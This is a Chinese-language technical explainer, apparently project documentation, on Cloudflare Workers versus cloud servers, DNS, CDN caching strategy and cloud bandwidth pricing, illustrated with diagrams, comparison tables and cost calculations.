# Cloudflare Worker 是什么?和云主机有什么区别?

## 一句话回答

**Worker 不是云主机**。云主机是一台你**长期租用**的虚拟机(有 CPU、内存、硬盘、操作系统),Worker 是**运行在 Cloudflare 边缘节点上的 Serverless 函数**,你只写代码、只付调用次数,不管服务器。

## 类比理解

| 概念 | 类比 | 你管什么 | 不管什么 |
|------|------|---------|---------|
| **物理机** | 买房 | 全部 | - |
| **云主机**(EC2/ECS) | 长租公寓 | 家具、水电、维修 | 物业、外墙 |
| **容器**(Docker on K8s) | 酒店长包房 | 行李、作息 | 床品、清洁、维修 |
| **Worker**(Serverless) | 共享办公位 | 笔记本电脑 | 桌子、椅子、网络、空调 |

Worker 的核心:**"用一下就来一下,不用就不存在"**。你不用开机、不用关机、不用 SSH、不用装 Nginx、不用打安全补丁,只写一段代码丢上去,有请求时 Cloudflare 调它,没请求时它不占资源。

## Worker 的本质

Cloudflare Worker 是**运行在 Cloudflare 全球边缘节点上的 JavaScript/TypeScript 函数**。每个请求到来时,Cloudflare 在离用户最近的边缘节点上**临时启动**你的函数来处理这个请求,处理完就结束。

```
用户请求 ──> Cloudflare 边缘节点(300+ 个)
                  │
                  ▼
              在这个节点上临时运行你的 Worker 代码
                  │
                  ▼
              返回响应给用户
```

**关键点**:代码**不在某一个机房**,而是**预先部署到全球所有边缘节点**。用户在东京访问,东京节点跑 Worker;用户在纽约访问,纽约节点跑 Worker。每个节点都有你代码的副本,自动就近执行。

## 技术实现:为什么 Worker 启动这么快?

云主机启动一个 Node 服务要几秒到几十秒(冷启动),Worker 冷启动只要 **5ms 左右**。原因:

### 1. 用 V8 Isolate,不用容器

云主机 / 传统 Serverless(Lambda)用容器隔离,每个容器要加载完整 OS、Node runtime,冷启动慢。

Worker 用 **Chrome V8 引擎的 Isolate**(`v8::Isolate`),这是 Chrome 浏览器隔离不同标签页的技术。一个 Worker 就是一个 Isolate,共享 V8 进程,但内存、堆栈隔离。

| 维度 | 容器(Lambda/云主机) | V8 Isolate(Worker) |
|------|-------------------|-------------------|
| 启动时间 | 100ms - 几秒 | ~5ms |
| 内存占用 | 几十 MB(系统开销) | 几 MB |
| 隔离方式 | OS 级 | V8 级(轻量但安全) |
| 单机能跑多少 | 几十 - 几百 | 几千 - 上万 |

### 2. 代码预热部署

`wrangler deploy` 时,你的代码会被**复制到全球所有边缘节点**。用户请求到达时,代码已经在那个节点等着了,不需要从中心机房拉取。

### 3. 没有持久化进程

Worker 处理完一个请求就"消失",不持有状态。下一个请求来时再起一个新 Isolate。这看起来像缺点(没法常驻内存),但其实是优点——**自动横向扩展,任意流量都能扛**,因为每个请求都是独立的。

## Worker 和云主机对比

| 维度 | 云主机(EC2/ECS) | Cloudflare Worker |
|------|-----------------|------------------|
| **本质** | 长期租用的虚拟机 | 边缘节点上的函数 |
| **运行位置** | 单一机房(你选的 region) | 全球 300+ 边缘节点(自动就近) |
| **启动时间** | 几十秒(开机) | ~5ms(冷启动) |
| **运行时长** | 持续运行,直到主动关机 | 单次请求,毫秒级 |
| **计费方式** | 按小时/月(包月包年) | 按请求数 + CPU 时间 |
| **计费起步** | 5-50 元/月 | 10 万请求/天免费 |
| **CPU 限制** | 你买的规格 | 免费 10ms/请求,付费 50ms |
| **内存限制** | 你买的规格 | 128 MB |
| **磁盘** | 有(几十 GB) | 无(用 R2 / KV 替代) |
| **持久状态** | 文件系统、数据库本地连接 | 无,必须用外部存储 |
| **网络** | 固定内网 IP,可监听端口 | 不能监听端口,只能被 HTTP 触发 |
| **协议** | 任意(TCP/UDP/HTTP/WebSocket) | HTTP / WebSocket / Email / Cron |
| **运维** | 装系统、补丁、监控、扩容 | 几乎零运维 |
| **可用性** | 单机房挂了就挂(除非多机房) | 单节点挂了自动切其他节点 |
| **全球加速** | 不自带,要自己挂 CDN | 天然全球边缘,自带 CDN |

## Worker 能做什么?

Worker 本质是"**一个 JavaScript 函数**",签名长这样:

```ts
export default {
  async fetch(request: Request, env: Env, ctx: ExecutionContext): Promise<Response> {
    // 收到请求,处理,返回响应
    return new Response('Hello World');
  },
};
```

每次有 HTTP 请求进来,Cloudflare 调这个 `fetch` 函数。你可以在里面做:

### 典型场景

| 场景 | 代码做什么 |
|------|----------|
| **静态站点托管**(本项目) | 从 R2 取文件,设置缓存头,返回 |
| **API 网关 / BFF** | 接收前端请求,聚合多个后端 API,返回 |
| **鉴权** | 校验 JWT,失败返回 401 |
| **A/B 测试** | 按用户 ID 哈希分流到不同版本 |
| **重定向** | 旧 URL 转 新 URL |
| **边缘 SSR** | 跑 React Server Components,边缘渲染 HTML |
| **图片处理** | 接收图片请求,从 R2 取原图,转换格式/尺寸,返回 |
| **爬虫防护** | 校验 User-Agent / IP 信誉,拦截可疑请求 |
| **CORS 代理** | 给前端跨域请求加 CORS 头 |
| **Webhook 接收** | 接收 GitHub / Stripe webhook,转发处理 |
| **定时任务** | Cron 触发,定期跑(如每天清理旧数据) |

## Worker 不能做什么?

| 限制 | 原因 |
|------|------|
| **不能监听 TCP/UDP 端口** | Worker 只能被 Cloudflare 触发,不是常驻服务 |
| **不能跑 MySQL / Redis 服务端** | Worker 是客户端,只能调外部服务 |
| **不能写本地文件** | 没有文件系统,要存就 R2 / KV |
| **CPU 时间受限** | 免费版 10ms / 付费版 50ms(单请求),CPU 密集任务不行 |
| **内存 128 MB** | 大数据集要分块,不能全加载 |
| **不能跑长连接任务** | 单请求最长 30 秒,长任务要拆 |
| **不能装 npm 任意包** | 只支持 WASM + 纯 JS 包,带 native binding 的不行(如 sharp、canvas) |
| **没有持久化进程内存** | 全局变量在请求间不共享(每个 Isolate 独立) |

## Worker 在本项目中的角色

本项目(`fe-depoly`)用 Worker 做**边缘网关**,代码在 `worker/src/index.ts`:

```
用户请求 ──> Cloudflare 边缘节点
                │
                ▼
            Worker 执行:
            1. 查边缘缓存(caches.default)
            2. 缓存未命中 → 从 R2 取文件
            3. 设置 Cache-Control 头
            4. SPA 路由回退(/users/123 → index.html)
            5. 返回响应
                │
                ▼
            响应回用户
```

**对应企业级架构**:Worker 在这里扮演的是 **API 网关 + 反向代理(Nginx) + CDN 边缘函数** 三合一的角色。云主机方案里这些事由 Nginx 容器做,Worker 方案里由边缘函数做。

| 任务 | 云主机方案 | Worker 方案 |
|------|---------|-----------|
| 接收 HTTP 请求 | Nginx 监听 80/443 | Cloudflare 边缘自动触发 Worker |
| 路由 / 回退 | Nginx `try_files` 配置 | Worker 代码逻辑 |
| 缓存控制 | Nginx `expires` 指令 | Worker `Cache-Control` 头 |
| HTTPS 证书 | 自己装 Let's Encrypt | Cloudflare 自动签发 |
| 全球加速 | 自己挂 CDN | 天然边缘,无需额外配置 |
| 横向扩展 | 多副本 + LB | 自动,每个请求独立 |

## 为什么不直接用云主机?

云主机当然也能干这些事,但本项目选 Worker 的原因:

1. **域名未备案**:云主机 + 国内 CDN 都要备案,Worker + 自定义域名不用
2. **零成本**:Worker 免费额度 10 万请求/天,够学习项目用;云主机最便宜也要几十元/月
3. **零运维**:不用管服务器、Nginx、证书、安全补丁
4. **天然全球加速**:Worker 部署即全球,云主机要自己挂 CDN
5. **学习价值**:Worker 是当下流行的"边缘计算"范式,值得掌握

## 为什么不所有项目都用 Worker?

Worker 也不是银弹,以下场景**不适合**:

| 场景 | 为什么不适合 | 用什么替代 |
|------|-----------|----------|
| **SSR + 重 Node 服务** | CPU 10ms 不够,要装 native 包 | 云主机 + Node + Docker |
| **长连接 / WebSocket 服务端** | Worker 能做 WebSocket 但不适合长会话 | 云主机 + Socket.IO |
| **数据库直连服务端** | Worker 不支持 TCP,只能调 HTTP API | 云主机 + Prisma |
| **后台任务 / 队列消费** | Worker 单请求 30s 上限 | 云主机 + BullMQ |
| **大文件上传中转** | Worker 内存 128MB 限制 | 云主机 + 流式处理 |
| **国内用户为主** | Worker 边缘节点在国内访问慢 | 阿里云 / 腾讯云国内节点 |

## Worker 的"周边生态"

Worker 不是孤立产品,Cloudflare 围绕它搭了一套边缘存储 / 计算服务:

| 产品 | 是什么 | 对应传统方案 |
|------|-------|------------|
| **Workers KV** | 边缘键值存储,最终一致 | Redis |
| **Workers D1** | 边缘 SQLite | MySQL / PostgreSQL |
| **R2** | 对象存储(S3 兼容) | AWS S3 / 阿里云 OSS |
| **Durable Objects** | 有状态对象,实时协作 | 不容易对应,类似带状态的 Worker |
| **Queues** | 消息队列 | RabbitMQ / Kafka |
| **Images** | 图片处理(裁剪/压缩) | 阿里云 IMM / Cloudinary |
| **Workers AI** | 边缘跑 LLM 推理 | OpenAI API / 自建 GPU |
| **Email Workers** | 收发邮件触发函数 | SendGrid webhook |

这些组合起来,可以在边缘搭出一个完整的"轻量后端",对应企业级架构里的 BFF + 存储 + 队列 + 缓存。

## 一图对比

```
传统云主机架构                          Cloudflare 边缘架构
─────────────                          ──────────────

用户                                     用户
 │                                       │
 ▼                                       ▼
DNS(智能解析)                           Cloudflare DNS(Anycast)
 │                                       │
 ▼                                       ▼
CDN(自己挂)                            Cloudflare 边缘节点(300+)
 │                                       │
 ▼                                       │ ┌── Worker(边缘函数)
LB / Nginx                              │ ├── KV(边缘 KV)
 │                                       │ ├── R2(对象存储)

 │                                       │

(单一机房或主从)                         (无单点,自动就近)

→ 多个产品拼装                            → 一个平台全包
→ 单机房为主                              → 全球边缘

→ 流量大时贵                              → 免费额度大
```

## 小结

- **Worker ≠ 云主机**。云主机是长期租用的虚拟机,Worker 是边缘节点上的函数。
- **Worker 的核心优势**:全球边缘部署、毫秒冷启动、按请求计费、零运维。
- **Worker 的核心限制**:CPU 时间短、内存小、无文件系统、无持久状态。
- **本项目用 Worker 当边缘网关**,代替传统架构里的 Nginx + CDN + API 网关。
- **生产环境怎么选**:轻量、低 CPU、全球用户的场景选 Worker;重 Node 服务、长连接、大数据场景选云主机;混合架构最常见。

# DNS 是什么?

## 一句话回答

**DNS(Domain Name System,域名系统)是互联网的"电话簿"**,把人类记得住的域名(`app.example.com`)翻译成机器能找到的 IP 地址(`104.21.56.89`)。

## 为什么需要 DNS?

互联网上的机器互相找,靠的是 **IP 地址**(类似 `104.21.56.89` 或 `2606:4700::6815:1abc`)。但人记不住数字,记得住名字。所以需要一个"翻译":

```
用户输入:  https://app.example.com
                │
                ▼
            DNS 查询
                │
                ▼
DNS 返回:   104.21.56.89
                │
                ▼
浏览器连接: 104.21.56.89:443,Host: app.example.com
```

没有 DNS,用户就得记 IP;有 DNS,用户只记域名,DNS 帮忙翻译。

## DNS 的分层结构(像查户口)

DNS 不是一个大服务器,而是**全球分布式、分层级**的系统。一次 DNS 查询会问很多层:

```
浏览器输入 app.example.com
        │
        ▼
┌──────────────────────────────────────────────┐
│ 1. 本地 DNS 缓存                              │
│    浏览器缓存 / OS 缓存 / 路由器缓存          │
│    命中直接返回,没命中往下问                  │
└──────────────────────────────────────────────┘
        │
        ▼
┌──────────────────────────────────────────────┐
│ 2. 递归解析器(Recursive Resolver)            │
│    通常是你的运营商或 8.8.8.8 / 1.1.1.1       │
│    它替你跑完下面所有步骤,拿到结果给你       │
└──────────────────────────────────────────────┘
        │
        ▼
┌──────────────────────────────────────────────┐
│ 3. 根域名服务器(Root DNS)                    │
│    问:"example.com 在哪?"                    │
│    答:"去问 .com 顶级域名服务器"             │
└──────────────────────────────────────────────┘
        │
        ▼
┌──────────────────────────────────────────────┐
│ 4. 顶级域名服务器(.com TLD DNS)              │
│    问:"example.com 在哪?"                    │
│    答:"去问 example.com 的权威 DNS"          │
└──────────────────────────────────────────────┘
        │
        ▼
┌──────────────────────────────────────────────┐
│ 5. 权威 DNS(Authoritative DNS)              │
│    这才是真正知道答案的服务器                 │
│    问:"app.example.com 的 IP?"               │
│    答:"104.21.56.89"                         │
└──────────────────────────────────────────────┘
        │
        ▼
递归解析器把答案返回给浏览器,同时缓存一段时间(TTL)
```

**类比**:像查户口——先问街道办(本地),再问区公安局(递归),再问公安部(根),再问省厅(TLD),最后问派出所(权威),才知道这个人住哪。

## 常见的 DNS 记录类型

| 记录类型 | 作用 | 例子 |
|---------|------|------|
| **A** | 域名 → IPv4 地址 | `app.example.com → 104.21.56.89` |
| **AAAA** | 域名 → IPv6 地址 | `app.example.com → 2606:4700::6815:1abc` |
| **CNAME** | 域名 → 另一个域名(别名) | `cdn.example.com → fe-depoly.cdn.cloudflare.net` |
| **MX** | 邮件服务器 | `example.com → mail.example.com` |
| **TXT** | 任意文本(常用于验证) | `example.com → "v=spf1 ..."`(SPF 防垃圾邮件) |
| **NS** | 这个域名的权威 DNS 在哪 | `example.com NS → ns1.cloudflare.com` |
| **SOA** | 域名主权威信息 | 含管理员邮箱、TTL、序列号 |
| **PTR** | IP → 域名(反向解析) | `104.21.56.89 → app.example.com` |

## DNS 和 Cloudflare 的关系

Cloudflare 既是**域名注册商**,也是**DNS 服务商**,还是**CDN 服务商**。本项目里它的角色:

```
用户买了个域名(example.com)
        │
        ▼
去注册商(可能是 Cloudflare / 阿里云 / GoDaddy)买域名
        │
        ▼
设置域名的 NS 记录,指向 Cloudflare 的权威 DNS
   NS example.com → ns1.cloudflare.com
   NS example.com → ns2.cloudflare.com
        │
        ▼
从此 example.com 的 DNS 解析权归 Cloudflare
        │
        ▼
在 Cloudflare 控制台加各种记录:
   A    app.example.com → 104.21.56.89(自动指向 Worker)
   CNAME api.example.com → backend.example.com
   MX   example.com → mail.example.com
```

**关键操作:把 NS 切到 Cloudflare**。这是用 Cloudflare CDN / Worker / R2 的前置条件。NS 不在 Cloudflare,Cloudflare 就管不了这个域名的 DNS,后续所有服务都接不上。

## DNS 几个关键概念

### TTL(Time To Live)

DNS 记录的"保质期",单位秒。TTL = 3600 表示解析器缓存这个记录 1 小时,1 小时后重新查。

| TTL | 适用场景 |
|-----|--------|
| 60s(1 分钟) | 频繁切换 IP(灰度、容灾) |
| 3600s(1 小时) | 一般业务 |
| 86400s(1 天) | 很少变的记录(省解析量) |

TTL 长 → 解析快、缓存命中高,但改 IP 后要等 TTL 过期才生效。
TTL 短 → 改 IP 快生效,但每次查询都要回源,慢一点。

### Anycast(任播)

一个 IP 在全球多个节点都"宣告"自己有这个 IP,用户请求被路由到**最近**的节点。Cloudflare 的所有边缘节点都用 Anycast,所以 `1.1.1.1` 在全球都能访问,而且自动就近。

对比:
- **Unicast**:一个 IP 对应一个节点,用户远的话延迟高
- **Anycast**:一个 IP 对应多个节点,用户自动就近 ← Cloudflare 用这个
- **Broadcast**:一个 IP 对应所有节点(互联网不用)

### DNS 缓存

DNS 结果会在多个层级缓存:

```
浏览器缓存(几秒~几分钟)
    │ 未命中
    ▼
OS 缓存(/etc/hosts / 系统 DNS)
    │ 未命中
    ▼
路由器缓存
    │ 未命中
    ▼
ISP / 运营商 DNS 缓存
    │ 未命中
    ▼
递归解析器(1.1.1.1 / 8.8.8.8)缓存
    │ 未命中
    ▼
权威 DNS
```

**影响**:改了 DNS 记录,**不是全球立即生效**,要等各级缓存按 TTL 过期。这就是为什么"改完 DNS 等 5 分钟~24 小时生效"。

# CDN 是什么?

## 一句话回答

**CDN(Content Delivery Network,内容分发网络)是把静态资源复制到全球很多个"边缘节点",让用户就近获取,不用每次都从源头机房拉**。

## 为什么需要 CDN?

假设你的源站在杭州,用户在纽约。用户访问一次网站:

```
没有 CDN:
用户(纽约) ────跨太平洋光缆────> 源站(杭州)
         往返延迟 ~200ms,大文件再叠加传输时间
         高并发时源站带宽被打满
```

```
有 CDN:
用户(纽约) ───> 纽约边缘节点(缓存命中) ──> 直接返回
         往返延迟 ~10ms,源站零压力
```

CDN 的核心价值:**就近返回 + 缓存命中 + 分摊源站压力**。

## CDN 的工作原理

```
1. 用户输入 https://app.example.com/logo.png
            │
            ▼
2. DNS 解析(关键:CDN 用 CNAME 把域名指向"智能 DNS")
            │
            ▼
3. CDN 智能 DNS 返回离用户最近的边缘节点 IP
   (用户在纽约 → 返回纽约节点 IP)
            │
            ▼
4. 用户连接最近的边缘节点,请求 /logo.png
            │
            ▼
5. 边缘节点查本地缓存:
   ├─ 命中 → 直接返回(快)
   └─ 未命中 → 回源(去源站拉),拉回来后存缓存,再返回给用户
            │
            ▼
6. 后续其他用户访问同一资源,直接命中缓存,不用回源
```

**关键概念**:
- **边缘节点(Edge Node)**:CDN 在全球部署的服务器,每个节点缓存一份资源副本
- **回源(Origin Pull)**:边缘节点缓存未命中时,去源站拉资源的动作
- **源站(Origin)**:资源的"老家",你的源服务器或对象存储(OSS / R2)

## CDN 的核心:缓存策略

CDN 怎么知道什么该缓存、缓存多久?靠 **HTTP 缓存头**:

```
HTTP/1.1 200 OK
Cache-Control: public, max-age=31536000, immutable
ETag: "abc123"
Last-Modified: Mon, 25 Jun 2026 10:00:00 GMT
```

| 头 | 作用 |
|---|------|
| `Cache-Control: max-age=N` | 缓存 N 秒 |
| `Cache-Control: public` | 任何缓存层(浏览器+CDN)都可以缓存 |
| `Cache-Control: private` | 只能浏览器缓存,CDN 不缓存 |
| `Cache-Control: immutable` | 文件永不变(配合 hash 文件名) |
| `ETag` | 文件指纹,变化时 ETag 变 |
| `Last-Modified` | 文件最后修改时间 |
| `Vary` | 按 Accept-Encoding / Accept-Language 等分别缓存 |

### SPA 项目的缓存策略(本项目)

| 资源 | 缓存头 | 为什么 |
|------|-------|------|
| `index.html` | `max-age=0, must-revalidate` | 入口文件,要快速更新,不能长缓存 |
| `assets/index-xxxx.js`(hash 文件名) | `max-age=31536000, immutable` | 一年缓存,文件名变了就是新文件 |
| `assets/index-xxxx.css` | `max-age=31536000, immutable` | 同上 |
| `logo.png`(无 hash) | `max-age=86400` | 中等缓存,改了用查询参数 `?v=2` 失效 |

**核心思路**:静态资源靠**文件名 hash** 实现版本管理,可以放心长缓存;HTML 入口短缓存,保证发版即时生效。

## CDN 的三层缓存

```
浏览器缓存(客户端)
    │ 未命中
    ▼
CDN 边缘节点缓存(用户最近的节点)
    │ 未命中
    ▼
CDN 父节点缓存(区域级,可选)
    │ 未命中
    ▼
源站(你的服务器 / OSS / R2)
```

每层命中,都跳过后续所有层。命中率越高,源站压力越小,用户体验越好。

## CDN 和云主机的对比

| 维度 | 云主机 + 自建 | CDN |
|------|------------|-----|
| 用户访问位置 | 单机房 | 全球边缘节点 |
| 高并发能力 | 受带宽限制 | 边缘节点分摊,几乎无限 |
| 全球延迟 | 远距离用户高 | 就近访问,延迟低 |
| 成本(大流量) | 带宽费贵 | 流量单价便宜 |
| 适用内容 | 静态 + 动态 | 主要静态(动态用动态加速) |
| 改文件生效 | 立即(本地文件) | 要等缓存过期或主动刷新 |

## CDN 几个关键概念

### Edge TTL(边缘缓存时间)

CDN 边缘节点缓存文件的时长。可以:
- **遵循源站 `Cache-Control`**(默认行为)
- **Dashboard 配 Cache Rules 覆盖源站**(强制 Edge TTL)
- **主动 Purge**(立即清除缓存)

### Purge(缓存刷新)

改了源站文件,但 CDN 边缘还在用旧缓存,需要主动 purge:

| 方式 | 作用范围 | 速度 |
|------|--------|------|
| **Purge Everything** | 全站所有缓存 | 30 秒生效,但瞬间回源压力大 |
| **Purge by URL** | 指定 URL | 30 秒生效,精确 |
| **Purge by Cache-Tag** | 按标签批量清(如所有 `html` 标签) | 30 秒,适合按类型清 |
| **Purge by Host** | 按域名清 | 30 秒 |

### Cache-Tag

给缓存对象打标签,方便批量刷新。Worker 代码里 `headers.set('Cache-Tag', 'html')` 就是干这个——以后改了 HTML,可以只刷新带 `html` 标签的对象,不影响静态资源缓存。

### Origin Pull(回源)

边缘节点缓存未命中时,去源站拉资源的过程。回源慢、回源多会压垮源站,所以 CDN 调优核心就是**减少回源**——提高命中率。

## CDN 和 Cloudflare 的关系

Cloudflare 自己就是一个**巨型 CDN**,全球 300+ 城市有边缘节点。用 Cloudflare CDN 的流程:

```
1. 域名 NS 切到 Cloudflare(参考前面 DNS 章节)
        │
        ▼
2. 在 Cloudflare 添加域名 → 自动开启 CDN
        │
        ▼
3. 配置源站(本项目源站是 R2 + Worker)
        │
        ▼
4. 设置缓存规则(Cache Rules / Page Rules)
        │
        ▼
5. 用户访问 → DNS 解析到 Cloudflare 边缘 → 缓存命中或回源
```

**Cloudflare CDN 的特点**:
- **自带 HTTPS**:Universal SSL 自动签发证书
- **自带 DDoS 防护**:免费,所有计划都包含
- **自带 WAF**:Web Application Firewall(付费版功能强)
- **Workers 集成**:CDN 节点能跑 Worker,边缘处理请求
- **R2 集成**:R2 当源站,CDN 缓存 R2 内容,无出口流量费

## 为什么"国内访问 Cloudflare CDN 慢"?

Cloudflare 在中国大陆**没有边缘节点**(除了 Enterprise 客户的特殊安排)。国内用户访问 Cloudflare CDN,请求会被路由到香港、日本、新加坡等节点,跨一次海底光缆,延迟比国内 CDN(阿里云/腾讯云)高。

| 用户位置 | Cloudflare 最近节点 | 大致延迟 |
|---------|-------------------|--------|
| 中国大陆 | 香港 / 日本 / 新加坡 | 50-150ms |
| 香港 | 香港 | 5-20ms |
| 美国 | 美国多个城市 | 5-30ms |
| 欧洲 | 欧洲多个城市 | 5-30ms |

**国内项目选 CDN**:走阿里云 / 腾讯云 / 白山云等国内 CDN,但**域名要 ICP 备案**。
**未备案的项目**:只能用 Cloudflare / Vercel / Netlify,接受国内访问慢的代价。

## CDN 能做什么(不止缓存静态文件)

| 功能 | 说明 |
|------|------|

| **动态加速** | TCP 优化、路由优化,加速动态 API |

| **Bot 管理** | 识别恶意爬虫,人机校验 |
| **A/B 测试** | 边缘分流,按用户特征走不同版本 |
| **地理路由** | 按用户国家 / 地区路由到不同源站 |
| **DDoS 防护** | 吸收流量攻击,免费版也有 |

# DNS / CDN / Worker 三者关系

在本项目里,DNS、CDN、Worker 三层协作,各管一段:

```
用户输入 https://app.example.com/users/123
        │
        ▼
┌──────────────────────────────────────────────┐
│ DNS 层(Cloudflare 权威 DNS)                │
│ 职责:把 app.example.com 翻译成最近边缘节点 IP│
│ 工具:Anycast + 智能 DNS                     │
└──────────────────────────────────────────────┘
        │
        ▼
┌──────────────────────────────────────────────┐
│ CDN 层(Cloudflare 边缘节点)                │
│ 职责:TLS 终止 + 边缘缓存 + 路由到 Worker    │
│ 工具:caches.default + Cache Rules           │
└──────────────────────────────────────────────┘
        │ 缓存未命中
        ▼
┌──────────────────────────────────────────────┐
│ Worker 层(边缘函数)                        │
│ 职责:路由 + 缓存策略 + SPA 回退 + 安全头    │
│ 工具:Worker 代码 + R2 绑定                  │
└──────────────────────────────────────────────┘
        │
        ▼
┌──────────────────────────────────────────────┐
│ R2 层(对象存储)                            │
│ 职责:存静态文件,Worker 取文件             │
└──────────────────────────────────────────────┘
```

### 三层职责一句话总结

| 层 | 一句话职责 | 没它会怎样 |
|---|---------|----------|
| **DNS** | 域名 → IP 翻译 + 就近路由 | 用户记不住 IP,找不到你 |
| **CDN** | 边缘缓存 + 全球加速 | 每次都回源,源站被打爆 |
| **Worker** | 边缘网关,处理请求逻辑 | 没有路由、没有缓存策略、没有鉴权 |

### 一次请求三层各做什么

以"用户访问 `https://app.example.com/assets/index-xxxx.js`"为例:

| 阶段 | DNS | CDN | Worker |
|------|-----|-----|--------|
| 1 | 把 app.example.com → 边缘 IP | - | - |
| 2 | - | 收到请求,查边缘缓存 | - |
| 3 | - | 缓存命中?直接返回(完) | - |
| 4 | - | 缓存未命中,转给 Worker | 收到请求 |
| 5 | - | - | 解析路径,从 R2 取文件 |
| 6 | - | - | 构造响应,设缓存头 |
| 7 | - | - | 返回响应给 CDN |
| 8 | - | 收到响应,写边缘缓存 | - |
| 9 | - | 返回给浏览器(完) | - |

**关键**:静态资源二次访问,只走 DNS + CDN 两层,Worker 完全不参与(缓存命中直接返回)。这也是为什么缓存对性能提升巨大。

## 小结

- **DNS = 互联网电话簿**,把域名翻译成 IP,本项目用 Cloudflare 权威 DNS
- **CDN = 内容分发网络**,把静态资源复制到全球边缘节点,用户就近获取
- **Worker = 边缘函数**,在 CDN 节点上跑代码,处理请求逻辑
- **三者关系**:DNS 找到节点 → CDN 缓存 + 转发 → Worker 处理逻辑
- **本项目组合**:Cloudflare DNS + CDN + Worker + R2,四件套覆盖了传统架构里的 DNS + CDN + Nginx + 对象存储四个角色

理解这三个概念,再回头看 `doc/cdn-cache.md` 的流程图,就能看懂每个环节是哪一层在做事情、为什么这样做。

# 前端项目放云主机,带宽怎么收费?

## 一句话回答

**要自己付带宽费**。云主机本身的费用里**通常包含少量基础带宽**(1~5 Mbps),超出部分按"带宽峰值"或"流量"另收费,具体计费方式看你选哪种模式。前端项目流量大的话,带宽费会比云主机本身贵得多。

## 谁在收钱?收什么钱?

把一次用户访问拆开看,每一段都有人收钱:

```
用户(家里宽带) ──> ISP(电信/联通) ──> 公网传输 ──> 云主机机房 ──> 你的服务器
                                                     │
                                                     ▼
                                              云厂商(阿里云/腾讯云/AWS)
                                              收的是这段的费用
```

- **用户那段**:用户家的宽带费,用户自己付给电信联通,不用你管
- **公网传输段**:互联网骨干网,云厂商已经和运营商结算过,打包卖给你
- **机房段**:云厂商收钱,包括**入网带宽**(用户访问你)和**出网带宽**(你返回给用户)

**前端项目主要消耗的是出网带宽**(把 HTML/JS/CSS/图片返回给用户),这也是云厂商主要计费的部分。

## 两种计费模式:按带宽 vs 按流量

云厂商一般提供两种计费方式,选错了会差很多钱:

### 模式 1:按固定带宽(包月)

像家里宽带,"我开 100 Mbps,不管用多少都是这么多钱"。

| 项 | 说明 |
|---|------|
| 计费单位 | Mbps(兆比特每秒,注意是小 b) |
| 计费方式 | 包月,固定峰值带宽 |
| 适用场景 | 流量稳定、长期跑 |
| 优点 | 流量大时单价便宜,可预测 |
| 缺点 | 流量小时浪费,峰值超了会被限速 |

**价格参考**(阿里云 ECS 公网带宽,2026 年大致):
- 1 Mbps:约 23 元/月
- 5 Mbps:约 115 元/月
- 10 Mbps:约 230 元/月
- 100 Mbps:约 2300 元/月
- 200 Mbps 以上:单价更低,但要联系销售

**关键**:5 Mbps 之上,每 Mbps 单价反而更贵(阶梯递减设计变了),所以中小项目常见配置是 5 Mbps 起步。

### 模式 2:按使用流量(按量计费)

像水电气,"用多少算多少"。

| 项 | 说明 |
|---|------|
| 计费单位 | GB(流量,实际传输的字节数) |
| 计费方式 | 用多少付多少,有包月套餐 |
| 适用场景 | 流量小、波动大、突发流量 |
| 优点 | 不用就 0 元,弹性 |
| 缺点 | 流量大时单价贵,不可预测 |

**价格参考**(阿里云,2026 年大致):
- 0.8 元/GB(中国大陆通用)
- 1.0 元/GB(香港)
- 0.5 元/GB(限时活动套餐,有量限制)

### 两种模式怎么选?

**算笔账**:假设你的前端项目每天 1000 个用户访问,每人加载 2 MB 资源(JS+CSS+图片)。

| 项 | 数值 |
|---|------|
| 日流量 | 1000 × 2 MB = 2 GB |
| 月流量 | 60 GB |
| 按流量计费 | 60 × 0.8 = **48 元/月** |
| 按带宽计费(峰值约 1 Mbps) | 1 Mbps × 23 = **23 元/月**(但峰值超 1 Mbps 会被限速) |

**经验法则**:
- 月流量 < 100 GB → 按流量计费便宜
- 月流量 > 500 GB 且峰值稳定 → 按带宽计费便宜
- 中间地带 → 看峰值/均值比,峰值高均值低选按流量,峰值稳定选按带宽

## 云厂商常见的"带宽陷阱"

### 陷阱 1:轻量服务器的"限带宽 + 不限流量"看起来美

阿里云 / 腾讯云的轻量应用服务器常宣传"4 核 6G 限 4 Mbps 带宽,不限流量,68 元/月"。

**真相**:
- 4 Mbps ≈ 500 KB/s,一个大 JS bundle(300 KB)用户要等 0.6 秒才能下载完
- 多个用户并发访问,4 Mbps 被分摊,每人速度更慢
- 不限流量听起来美,但带宽上限太低,根本用不出流量

**适用**:个人博客、小流量站点,绝对不要做 C 端项目生产环境

### 陷阱 2:ECS 默认 0 Mbps,公网要另买

云主机 ECS 买的时候默认**没有公网 IP** 或 **0 Mbps 带宽**,要另买"公网带宽"才 能访问。新手买了服务器发现访问不了,就是这个原因。

**正确做法**:买 ECS 时勾选"按固定带宽"或"按使用流量",并分配弹性公网 IP(EIP)。

### 陷阱 3:跨地域流量贵

| 流量方向 | 单价(阿里云参考) |
|---------|-----------------|
| 国内 → 国内 | 0.8 元/GB |
| 国内 → 海外 | 1.0~2.5 元/GB |
| 海外 → 国内 | 1.0 元/GB |
| 海外 → 海外 | 看区域,1.0~2.0 元/GB |

如果源站在杭州,海外用户访问,跨境流量贵 2-3 倍。这就是为什么海外用户多的项目要上 CDN——CDN 跨境流量单价更低,而且边缘节点缓存命中后根本不回源。

### 陷阱 4:CDN 流量和云主机带宽是分开计费的

很多人以为"我买了 5 Mbps 云主机带宽,用 CDN 不会再收钱"。**错**。

- 云主机带宽:用户 → 云主机的流量(回源流量)
- CDN 流量:用户 → CDN 边缘节点的流量(独立计费)

**正确理解**:CDN 帮你省的是**云主机带宽**(回源少了),但 CDN 流量本身要单独付费。不过 CDN 流量单价更低(0.2~0.3 元/GB),且边缘缓存命中后不回源,综合成本下降。

## 带宽计算实战

### 案例:你的前端项目部署在阿里云 ECS

```
项目:React SPA,dist/ 总大小 2 MB
用户:日均 1 万 PV,平均每人 1 次访问
峰值:晚上 8-10 点,占总流量 30%
```

**带宽计算**:

| 项 | 计算 | 结果 |
|---|------|------|
| 日流量 | 10000 × 2 MB | 20 GB |
| 月流量 | 20 × 30 | 600 GB |
| 峰值带宽 | 600 GB / 30天 / 86400秒 × 8(字节转比特) × 集中系数 3 | ~5 Mbps |

**费用估算**(2026 年大致价格):

| 方案 | 月费用 | 优劣 |
|------|-------|------|
| 按流量 0.8 元/GB | 600 × 0.8 = **480 元** | 峰值不限,但贵 |
| 按带宽 5 Mbps | 5 × 23 = **115 元** | 便宜,但峰值受限 |
| 按带宽 10 Mbps | 10 × 23 = **230 元** | 峰值有余量,推荐 |
